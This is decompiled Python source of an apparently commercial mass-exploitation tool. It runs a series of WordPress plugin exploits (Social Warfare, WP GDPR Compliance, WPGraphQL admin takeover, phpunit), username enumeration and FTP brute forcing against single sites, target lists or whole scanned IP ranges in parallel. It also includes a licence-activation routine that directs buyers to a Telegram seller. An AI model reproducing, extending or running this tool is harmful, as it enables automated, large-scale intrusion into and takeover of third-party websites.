                i = CVE_2019_9978SocialWarfare.Exploit(site)
                Rez(site, i)
                i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
                Rez(site, i)
                i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
                Rez(site, i)
                i = wpinstall.Check(site, YOUR_Email_For_TAkeAdmin_Exploit)
                Rez(site, i)
                i = phpunit.Exploit(site, 'Wordpress')
                Rez(site, i)
                mkobj = Wordpress.Wordpress()
                i = mkobj.UserName_Enumeration(site)
                Rez(site, i)
                FTPBruteForce.Exploit(site)
            except:
                print (' {}- {}{} {}--> {} Crashed!{}').format(r, w, site, c, y, w)


def Banner():
    r = '\x1b[31m'
    g = '\x1b[32m'
    y = '\x1b[33m'
    w = '\x1b[37m'
    bb = open('files/banner.txt', 'r').read()
    print bb.format(r, g, r, w, r, y, w)


def ScanRangeIP(start, end):
    Start = list(map(int, start.split('.')))
    end = list(map(int, end.split('.')))
    rec = Start
    ip_range = []
    ip_range.append(start)
    while rec != end:
        Start[3] += 1
        for i in (3, 2, 1):
            if rec[i] == 256:
                rec[i] = 0
                rec[(i - 1)] += 1

        ip_range.append(('.').join(map(str, rec)))

    return ip_range


def Exce(Ran):
    freeze_support()
    try:
        p = Pool(45)
        p.map(JEX, Ran)
    except WindowsError:
        pass


def main():
    clear()
    Banner()
    while True:
        n = raw_input('Chose> ')
        if n == '1':
            start = raw_input(' START IP [192.168.1.1]: ')
            end = raw_input(' END IP [192.168.1.100]: ')
            try:
                ss = ScanRangeIP(start, end)
                if len(ss) != 0:
                    Exce(ss)
            except:
                print '   not Valid...Range ip~'
                continue
            else:
                continue

        elif n == '2':
            try:
                xf = raw_input('  Target: ')
                JEX(xf)
            except:
                continue

        elif n == '3':
            try:
                ww = open(raw_input('List.TXT: '), 'r').read().splitlines()
                Exce(ww)
            except:
                continue

        else:
            continue


def get_id():
    if 'nt' in os.name:
        return str(check_output('wmic csproduct get uuid').split('UUID')[1]).replace(' ', '').split('\n')[1].split('\r')[0]
    else:
        return 'OS PROBLEM'


def FunctionEncrypt(ID):
    if ID == 'OS PROBLEM':
        print ' JEX Works only on Windows Platform'
    else:
        M = ('{}').format(str(ID).split('-')[4].encode('base64')[::-1]) + '/' + ('FuckYou').encode('base64')[::-1].replace('\n', '')
        print ('     For Activation SEND This KEY to t.me/JEXSeller --> {}').format(M.splitlines()[1].encode('base64')[::1])
if __name__ == '__main__':
	freeze_support()
	main()
# okay decompiling x.pyc
